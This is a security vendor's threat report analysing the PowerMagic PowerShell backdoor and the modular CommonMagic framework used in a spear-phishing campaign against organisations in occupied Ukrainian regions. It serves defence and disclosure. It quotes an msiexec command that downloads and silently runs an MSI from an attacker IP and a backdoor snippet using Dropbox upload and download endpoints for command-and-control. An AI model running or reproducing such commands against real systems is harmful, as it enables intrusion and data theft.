Administrative organizations were attacked with PowerMagic backdoor
and CommonMagic framework
Since the start of the Russo-Ukrainian conflict, Kaspersky researchers and the international
community at large have identified a significant number of cyberattacks executed in a political and
geopolitical context. We previously published an overview of cyber activities and the threat
landscape related to the conflict between Russia and Ukraine and continue to monitor new threats
in these regions.
In October 2022, we identified an active infection of government, agriculture and transportation
organizations located in the Donetsk, Lugansk, and Crimea regions. Although the initial vector of
compromise is unclear, the details of the next stage imply the use of spear phishing or similar

methods. The victims navigated to a URL pointing to a ZIP archive hosted on a malicious web
server. The archive, in turn, contained two files:
A decoy document (we discovered PDF, XLSX and DOCX versions)
A malicious LNK file with a double extension (e.g., .pdf.lnk) that leads to infection when
opened

Decoy Word document (subject: Results of the State Duma elections in the Republic of
Crimea)
In several cases, the contents of the decoy document were directly related to the name of the
malicious LNK to trick the user into activating it. For example, one archive contained an LNK file
named “Приказ Минфина ДНР № 176.pdf.lnk” (Ministry of Finance Decree No. 176), and the
decoy document explicitly referenced it by name in the text.

When the potential victim activates the LNK file included in the ZIP file, it triggers a chain of
events that lead to the infection of the computer with a previously unseen malicious framework
that we named CommonMagic. The malware and techniques used in this campaign are not
particularly sophisticated, but are effective, and the code has no direct relation to any known
campaigns.

Installation workflow
The malicious LNK points to a remotely hosted malicious MSI file that is downloaded and started
by the Windows Installer executable.

%WINDIR%\System32\msiexec.exe /i

http://185.166.217[.]184/CFVJKXIUPHESRHUSE4FHUREHUIFERAY97A4FXA/attachment.msi
/quiet

The MSI file is effectively a dropper package, containing an encrypted next-stage payload
(service_pack.dat), a dropper script (runservice_pack.vbs) and a decoy document that is
supposed to be displayed to the victim.

Files contained in attachment.msi
The encrypted payload and the decoy document are written to the folder named
%APPDATA%\WinEventCom. The VBS dropper script is, in turn, a wrapper for launching an
embedded PowerShell script that decrypts the next stage using a simple one-byte XOR, launches

it and deletes it from disk.

The next-stage script finalizes the installation: it opens the decoy document to display it to the
user, writes two files named config and manutil.vbs to %APPDATA%\WinEventCom, and
creates a Task Scheduler job named WindowsActiveXTaskTrigger, to execute
the wscript.exe%APPDATA%\WinEventCom\manutil.vbs command every day.

The PowerMagic backdoor
The script manutil.vbs, which is dropped by the initial package, is a loader for a previously
unknown backdoor written in PowerShell that we named PowerMagic. The main body of the
backdoor is read from the file %APPDATA%\WinEventCom\config and decrypted with a simple

7/11

XOR (key: 0x10).

$ClinetDir='client';

$ClientToken=redacted

6

$dbx_up='https://content.dropboxapi.com/2/files/upload';

7

$dbx_down = 'https://content.dropboxapi.com/2/files/download';

When started, the backdoor creates a mutex – WinEventCom. Then, it enters an infinite loop
communicating with its C&C server, receiving commands and uploading results in response. It
uses OneDrive and Dropbox folders as transport, and OAuth refresh tokens as credentials.
Every minute the backdoor performs the following actions:
1. Modifies the heartbeat file located at /$AppDir/$ClientDir/<machine UID> (the values of the
$AppDir and $ClientDir PowerShell variables may differ between samples). The contents of
this file consist of the backdoor PID and a number incremented by one with each file
modification.
2. Downloads commands that are stored as a file in the /$AppDir/$ClientTaskDir directory.
3. Executes every command as a PowerShell script.
4. Uploads the output of the executed PowerShell command to the cloud storage, placing it in
the /$AppDir/$ClientResultDir/<victim machine UUID>.<timestamp> file.

The CommonMagic framework
As it turned out, PowerMagic was not the only malicious toolkit used by the actor. All the victims of
PowerMagic were also infected with a more complicated, previously unseen, modular malicious
framework that we named CommonMagic. This framework was deployed after initial infection with
the PowerShell backdoor, leading us to believe that CommonMagic is deployed via PowerMagic.
The CommonMagic framework consists of several executable modules, all stored in the directory
C:\ProgramData\CommonCommand. Modules start as standalone executable files and
communicate via named pipes. There are dedicated modules for interaction with the C&C server,
encryption and decryption of the C&C traffic and various malicious actions.
The diagram below illustrates the architecture of the framework.

Framework architecture

Network communication
The framework uses OneDrive remote folders as a transport. It utilizes the Microsoft Graph API
using an OAuth refresh token embedded into the module binary for authentication. The
RapidJSON library is used for parsing JSON objects returned by the Graph API.
A dedicated heartbeat thread updates the remote file <victim ID>/S/S.txt every five minutes with
the local timestamp of the victim.
Then, in separate threads, the network communication module downloads new executable
modules from the directory <victim ID>/M and uploads the results of their execution to the
directory <victim ID>/R.
The data exchanged with the operator via the OneDrive location is encrypted using the
RC5Simple open-source library. By default, this library uses the seven-byte sequence “RC5SIMP”
at the beginning of the encrypted sequence, but the developers of the backdoor changed it to
“Hwo7X8p”. Encryption is implemented in a separate process, communicating over the pipes
named \\.\pipe\PipeMd and \\.\pipe\PipeCrDtMd.

Plugins
So far, we have discovered two plugins implementing the malicious business logic. They are
located in the directory C:\ProgramData\CommonCommand\Other.
Screenshot (S.exe) – takes screenshots every three seconds using the GDI API

USB (U.exe) – collects the contents of the files with the following extensions from connected
USB devices: .doc, .docx. .xls, .xlsx, .rtf, .odt, .ods, .zip, .rar, .txt, .pdf.

To be continued
So far, we have found no direct links between the samples and data used in this campaign and
any previously known actors. However, the campaign is still active, and our investigation
continues. So, we believe that further discoveries may reveal additional information about this
malware and the threat actor behind it.
